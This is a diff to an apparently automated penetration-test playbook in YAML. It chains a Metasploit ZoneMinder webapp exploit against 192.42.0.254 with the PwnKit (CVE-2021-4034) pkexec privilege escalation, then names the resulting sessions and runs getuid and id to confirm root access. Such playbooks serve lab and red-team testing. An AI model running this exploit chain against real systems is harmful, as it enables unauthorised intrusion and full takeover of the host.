@@ -13,6 +13,7 @@ commands:
 
   - type: msf-module
     cmd: exploit/unix/webapp/zoneminder_snapshots
+    creates_session: "foothold"
     options:
       RHOSTS: 192.42.0.254
     payload_options:
@@ -23,7 +24,8 @@ commands:
       #    seconds: 60
   - type: msf-module
     cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
-    auto_session: True
+    session: "foothold"
+    creates_session: "root"
     options:
       WRITABLE_DIR: "/tmp"
     payload_options:
@@ -46,10 +48,17 @@ commands:
       #    cmd: shell
 
   - type: msf-session
+    stdapi: True
+    session: "foothold"
+    cmd: getuid
+
+  - type: msf-session
+    session: "root"
     write: True
     cmd: id
 
   - type: msf-session
+    session: "root"
     read: True
     cmd: id
 
